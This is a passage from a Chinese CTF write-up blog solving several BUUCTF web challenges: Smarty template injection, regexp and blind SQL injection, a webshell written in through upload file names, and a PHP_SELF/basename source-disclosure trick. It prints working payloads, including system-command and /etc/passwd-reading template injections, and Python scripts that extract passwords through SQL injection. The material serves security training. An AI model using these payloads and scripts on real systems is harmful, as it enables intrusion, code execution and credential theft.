class="token comment" spellcheck="true">&lt;!--#config errmsg="File not found, informs users and password"--></span></code></pre><p>显示当前文档的文件名：</p><pre class=" language-html"><code class="language-html"><span class="token comment" spellcheck="true">&lt;!--#echo var="DOCUMENT_NAME" --></span></code></pre><p>显示虚拟路径和文件名：</p><pre class=" language-html"><code class="language-html"><span class="token comment" spellcheck="true">&lt;!--#echo var="DOCUMENT_URI" --></span></code></pre><p>使用“ config”命令和“ timefmt”参数，可以控制日期和时间输出格式：</p><pre class=" language-html"><code class="language-html"><span class="token comment" spellcheck="true">&lt;!--#config timefmt="A %B %d %Y %r"--></span></code></pre><p>使用“ fsize”命令，可以打印所选文件的大小：</p><pre class=" language-html"><code class="language-html"><span class="token comment" spellcheck="true">&lt;!--#fsize file="ssi.shtml" --></span></code></pre><h1 id="CISCN2019-华东南赛区-Web11"><a href="#CISCN2019-华东南赛区-Web11" class="headerlink" title="[CISCN2019 华东南赛区]Web11"></a>[CISCN2019 华东南赛区]Web11</h1><p><strong>考点：smarty ssti</strong></p><p>..这一整页英文..看着就头疼，但还好有个smarty的提示。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201210190110082.png" srcset="/img/loading.gif" alt="image-20201210190110082"></p><p>源代码看见，版本smarty3-&gt;ssti</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201210190506686.png" srcset="/img/loading.gif" alt="image-20201210190506686"></p><p>各个参数里都尝试一下，找到xff中存在ssti。(他这页面估计也是在提示这里)</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201210191946987.png" srcset="/img/loading.gif" alt="image-20201210191946987"></p><p>payload</p><pre><code>X-Forwarded-For:{if phpinfo()}{/if}X-Forwarded-For:{if system(&quot;ls /&quot;)}{/if}X-Forwarded-For:{if system(&quot;cat /flag&quot;)}{/if}</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201210192059868.png" srcset="/img/loading.gif" alt="image-20201210192059868"></p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201210192329246.png" srcset="/img/loading.gif" alt="image-20201210192329246">)<img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201210192403413.png" srcset="/img/loading.gif" alt="image-20201210192403413"></p><h2 id="Smarty-SSTI-利用方式"><a href="#Smarty-SSTI-利用方式" class="headerlink" title="Smarty SSTI 利用方式"></a>Smarty SSTI 利用方式</h2><p><strong>常规利用方式</strong></p><p>1.{literal} 标签</p><pre><code>{literal}可以让一个模板区域的字符原样输出。这经常用于保护页面上的Javascript或css样式表，避免因为Smarty的定界符而错被解析。</code></pre><p>那么就可以构造,但此方法仅在php5中适用。</p><pre><code>{literal &lt;script language=&quot;php&quot;&gt;phpinfo();&lt;/script&gt;}{/literal}</code></pre><p>2.{php}标签</p><p>官方文档</p><blockquote><p>Smarty已经废弃{php}标签，强烈建议不要使用。在Smarty 3.1，{php}仅在SmartyBC中可用。</p></blockquote><p><strong>静态方法</strong></p><p>1.通过self获取Smarty类再调用其静态方法实现文件读写（仅适用于旧版本 &lt;3.1.30(?)）</p><p>Smarty类的getStreamVariable方法的代码如下：</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getStreamVariable</span><span class="token punctuation">(</span><span class="token variable">$variable</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token variable">$_result</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>     <span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$variable</span><span class="token punctuation">,</span> <span class="token string">'r+'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$current_line</span> <span class="token operator">=</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>             <span class="token variable">$_result</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$current_line</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>         <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span> <span class="token variable">$_result</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token variable">$smarty</span> <span class="token operator">=</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">smarty</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">smarty</span> <span class="token punctuation">:</span> <span class="token variable">$this</span><span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$smarty</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">error_unassigned</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">SmartyException</span><span class="token punctuation">(</span><span class="token string">'Undefined stream variable "'</span> <span class="token punctuation">.</span> <span class="token variable">$variable</span> <span class="token punctuation">.</span> <span class="token string">'"'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">else</span> <span class="token punctuation">{</span>         <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span></code></pre><p>方法可以读取一个文件并返回其内容，所以我们可以用self来获取Smarty对象并调用这个方法</p><p>payload</p><pre><code>{self::getStreamVariable(&quot;file:///etc/passwd&quot;)}</code></pre><p>2.{if}</p><blockquote><p>Smarty的{if}条件判断和PHP的if 非常相似，只是增加了一些特性。每个{if}必须有一个配对的{/if}. 也可以使用{else} 和 {elseif}. 全部的PHP条件表达式和函数都可以在if内使用，如<em>||</em>, or, &amp;&amp;, and, is_array(), 等等</p></blockquote><p>payload</p><pre><code>{if phpinfo()}{/if}</code></pre><blockquote><p>参考</p><p><a href="https://www.freebuf.com/column/219913.html" target="_blank" rel="noopener">https://www.freebuf.com/column/219913.html</a></p></blockquote><h1 id="NCTF2019-SQLi"><a href="#NCTF2019-SQLi" class="headerlink" title="[NCTF2019]SQLi"></a>[NCTF2019]SQLi</h1><p><strong>考点：regexp 注入</strong></p><p>进来给了登录框和查询语句。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201211113543181.png" srcset="/img/loading.gif" alt="image-20201211113543181"></p><p>常规扫一波后台，发现robots.txt。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201211112818680.png" srcset="/img/loading.gif" alt="image-20201211112818680"></p><p>直接给了黑名单。</p><pre class=" language-php"><code class="language-php"><span class="token variable">$black_list</span> <span class="token operator">=</span> <span class="token string">"/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\'|=| |in|&lt;|>|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i"</span><span class="token punctuation">;</span><span class="token keyword">If</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'passwd'</span><span class="token punctuation">]</span> <span class="token operator">===</span> admin's password<span class="token punctuation">,</span>Then you will get the flag<span class="token punctuation">;</span>select <span class="token operator">*</span> from users where username<span class="token operator">=</span><span class="token string">''</span> <span class="token keyword">and</span> passwd<span class="token operator">=</span><span class="token string">''</span></code></pre><p> 下面就是构造语句查admin密码了。</p><p>虽然过滤了很多东西，但是regexp还在，</p><p>再用\转义掉 ‘ ，用/**/绕空格</p><p>payload</p><pre><code>username=\&amp;passwd=||/**/passwd/**/regexp/**/&quot;^a&quot;;%00</code></pre><p>看一下报文有啥区别好写脚本。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201211141802155.png" srcset="/img/loading.gif" alt="image-20201211141802155"></p><p>脚本</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> string<span class="token keyword">import</span> requests<span class="token keyword">from</span> urllib <span class="token keyword">import</span> parsepasswd <span class="token operator">=</span> <span class="token string">''</span>string<span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_lowercase <span class="token operator">+</span> string<span class="token punctuation">.</span>digits <span class="token operator">+</span> <span class="token string">'_'</span>url <span class="token operator">=</span> <span class="token string">'http://9ba5ab21-ccbe-498c-aa7f-398794a7df36.node3.buuoj.cn'</span><span class="token keyword">for</span> n <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> m <span class="token keyword">in</span> string<span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">"username"</span><span class="token punctuation">:</span><span class="token string">"\\"</span><span class="token punctuation">,</span>            <span class="token string">"passwd"</span><span class="token punctuation">:</span><span class="token string">"||/**/passwd/**/regexp/**/\"^{}\";{}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token punctuation">(</span>passwd<span class="token operator">+</span>m<span class="token punctuation">)</span><span class="token punctuation">,</span>parse<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span><span class="token string">'%00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'welcome'</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            passwd <span class="token operator">+=</span> m            <span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span>passwd<span class="token punctuation">)</span></code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201211143716927.png" srcset="/img/loading.gif" alt="image-20201211143716927"></p><p>直接post passwd</p><p>得到flag。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201211143746886.png" srcset="/img/loading.gif" alt="image-20201211143746886"></p><h1 id="CISCN2019-总决赛-Day2-Web1-Easyweb"><a href="#CISCN2019-总决赛-Day2-Web1-Easyweb" class="headerlink" title="[CISCN2019 总决赛 Day2 Web1]Easyweb"></a>[CISCN2019 总决赛 Day2 Web1]Easyweb</h1><p><strong>考点：文件泄露，盲注，php短标签</strong></p><p>啊。。熟悉的界面</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201211145016437.png" srcset="/img/loading.gif" alt="image-20201211145016437"></p><p>扫扫先</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201211145725380.png" srcset="/img/loading.gif" alt="image-20201211145725380"></p><p>备份文件泄露</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201211145847670.png" srcset="/img/loading.gif" alt="image-20201211145847670"></p><p>都试试，只有image.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span> <span class="token string">"config.php"</span><span class="token punctuation">;</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string">"1"</span><span class="token punctuation">;</span><span class="token variable">$path</span><span class="token operator">=</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"path"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"path"</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">;</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$path</span><span class="token operator">=</span><span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"\\0"</span><span class="token punctuation">,</span><span class="token string">"%00"</span><span class="token punctuation">,</span><span class="token string">"\\'"</span><span class="token punctuation">,</span><span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$path</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"\\0"</span><span class="token punctuation">,</span><span class="token string">"%00"</span><span class="token punctuation">,</span><span class="token string">"\\'"</span><span class="token punctuation">,</span><span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span><span class="token string">"select * from images where id='{$id}' or path='{$path}'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$row</span><span class="token operator">=</span><span class="token function">mysqli_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">,</span><span class="token constant">MYSQLI_ASSOC</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$path</span><span class="token operator">=</span><span class="token string">"./"</span> <span class="token punctuation">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">"path"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-Type: image/jpeg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>这和上一道题差不多，还是用\转义，不过是多了个str_replace。后面就直接盲注。</p><p>exp</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span>  requestsurl <span class="token operator">=</span> <span class="token string">"http://f1eec99b-3d95-4c68-91cb-f245f2684a39.node3.buuoj.cn/image.php?id=\\0&amp;path="</span>payload1 <span class="token operator">=</span> <span class="token string">"or if(ascii(substr((select database()),{0},1))>{1},1,0)%23"</span>payload2 <span class="token operator">=</span> <span class="token string">"or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{0},1))>{1},1,0)%23"</span>payload3 <span class="token operator">=</span> <span class="token string">"or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273),{0},1))>{1},1,0)%23"</span>payload4 <span class="token operator">=</span> <span class="token string">"or if(ascii(substr((select username from users),{0},1))>{1},1,0)%23"</span>result <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">def</span> <span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    payload1 <span class="token operator">=</span> <span class="token string">"or if(ascii(substr((select database()),{0},1))>{1},1,0)%23"</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        l <span class="token operator">=</span> <span class="token number">1</span>        r <span class="token operator">=</span> <span class="token number">130</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>l<span class="token operator">&lt;</span>r<span class="token punctuation">)</span><span class="token punctuation">:</span>            payloads <span class="token operator">=</span> payload1<span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">,</span>mid<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>url<span class="token operator">+</span>payloads<span class="token punctuation">)</span>            html <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span>payloads<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">"JFIF"</span> <span class="token keyword">in</span> html<span class="token punctuation">.</span>text<span class="token punctuation">:</span>                l <span class="token operator">=</span> mid <span class="token operator">+</span><span class="token number">1</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                r <span class="token operator">=</span> mid            mid <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span>        result<span class="token operator">+=</span>chr<span class="token punctuation">(</span>mid<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>    <span class="token keyword">return</span> result<span class="token keyword">def</span> <span class="token function">table_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    table_name<span class="token operator">=</span><span class="token string">""</span>    payload2 <span class="token operator">=</span> <span class="token string">"or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{0},1))>{1},1,0)%23"</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        l <span class="token operator">=</span> <span class="token number">1</span>        r <span class="token operator">=</span> <span class="token number">130</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>l<span class="token operator">&lt;</span>r<span class="token punctuation">)</span><span class="token punctuation">:</span>            payloads <span class="token operator">=</span> payload2<span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">,</span>mid<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>url<span class="token operator">+</span>payloads<span class="token punctuation">)</span>            html <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span>payloads<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">"JFIF"</span> <span class="token keyword">in</span> html<span class="token punctuation">.</span>text<span class="token punctuation">:</span>                l <span class="token operator">=</span> mid <span class="token operator">+</span><span class="token number">1</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                r <span class="token operator">=</span> mid            mid <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span>        table_name<span class="token operator">+=</span>chr<span class="token punctuation">(</span>mid<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>table_name<span class="token punctuation">)</span>    <span class="token keyword">return</span> table_name<span class="token keyword">def</span> <span class="token function">column_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    column_name<span class="token operator">=</span><span class="token string">""</span>    table_name <span class="token operator">=</span> <span class="token string">"0x70617373776f7264"</span>    payload3 <span class="token operator">=</span> <span class="token string">"or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273),{0},1))>{1},1,0)%23"</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        l <span class="token operator">=</span> <span class="token number">1</span>        r <span class="token operator">=</span> <span class="token number">130</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>l<span class="token operator">&lt;</span>r<span class="token punctuation">)</span><span class="token punctuation">:</span>            payloads <span class="token operator">=</span> payload3<span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">,</span>mid<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>url<span class="token operator">+</span>payloads<span class="token punctuation">)</span>            html <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span>payloads<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">"JFIF"</span> <span class="token keyword">in</span> html<span class="token punctuation">.</span>text<span class="token punctuation">:</span>                l <span class="token operator">=</span> mid <span class="token operator">+</span><span class="token number">1</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                r <span class="token operator">=</span> mid            mid <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span>        column_name<span class="token operator">+=</span>chr<span class="token punctuation">(</span>mid<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>column_name<span class="token punctuation">)</span>    <span class="token keyword">return</span> column_name<span class="token keyword">def</span> <span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data<span class="token operator">=</span><span class="token string">""</span>    payload4 <span class="token operator">=</span> <span class="token string">"or if(ascii(substr((select password from users),{0},1))>{1},1,0)%23"</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        l <span class="token operator">=</span> <span class="token number">1</span>        r <span class="token operator">=</span> <span class="token number">130</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>l<span class="token operator">&lt;</span>r<span class="token punctuation">)</span><span class="token punctuation">:</span>            payloads <span class="token operator">=</span> payload4<span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">,</span>mid<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>url<span class="token operator">+</span>payloads<span class="token punctuation">)</span>            html <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span>payloads<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">"JFIF"</span> <span class="token keyword">in</span> html<span class="token punctuation">.</span>text<span class="token punctuation">:</span>                l <span class="token operator">=</span> mid <span class="token operator">+</span><span class="token number">1</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                r <span class="token operator">=</span> mid            mid <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span>        data<span class="token operator">+=</span>chr<span class="token punctuation">(</span>mid<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">return</span> data<span class="token comment" spellcheck="true">#table_name()</span><span class="token comment" spellcheck="true">#column_name()</span>data<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>c0169285544b922a11ac</code></pre><p>随便上传一个文件，可以看到记录的是上传日志。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201211173715599.png" srcset="/img/loading.gif" alt="image-20201211173715599"></p><p>用文件名写马进去就可以了。</p><p>他把php过滤了</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201211174113431.png" srcset="/img/loading.gif" alt="image-20201211174113431"></p><p>那就用短标签绕过</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201211175156875.png" srcset="/img/loading.gif" alt="image-20201211175156875"></p><p>连shell找到flag。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201211175601541.png" srcset="/img/loading.gif" alt="image-20201211175601541"></p><h1 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h1><p>进来给了源码</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span> <span class="token string">'config.php'</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// FLAG is defined in config.php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/config\.php\/*$/i'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'PHP_SELF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">"I don't know what you are thinking, but I won't let you read it :)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'PHP_SELF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$secret</span> <span class="token operator">=</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">random_bytes</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'guess'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token variable">$guess</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'guess'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">hash_equals</span><span class="token punctuation">(</span><span class="token variable">$secret</span><span class="token punctuation">,</span> <span class="token variable">$guess</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token string">'Congratulations! The flag is: '</span> <span class="token punctuation">.</span> <span class="token constant">FLAG</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>  <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token string">'Wrong.'</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>一开始，先看了下半部分的代码。大概意思取随机64位数，你post值和它相等就弹flag。</p><p>但实际上，问题出在上半部分。</p><p>PHP_SELF</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201211193934469.png" srcset="/img/loading.gif" alt="image-20201211193934469"></p><p>basename</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201211194114405.png" srcset="/img/loading.gif" alt="image-20201211194114405"></p><p>那么这段代码，</p><p>比如url中传入a.php/b.php</p><p>执行的是a.php</p><p>$_SERVER[‘PHP_SELF’]=a.php/b.php</p><p>而basename($_SERVER[‘PHP_SELF’])=b.php</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/config\.php\/*$/i'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'PHP_SELF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//限制结尾出现config.php</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">"I don't know what you are thinking, but I won't let you read it :)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span 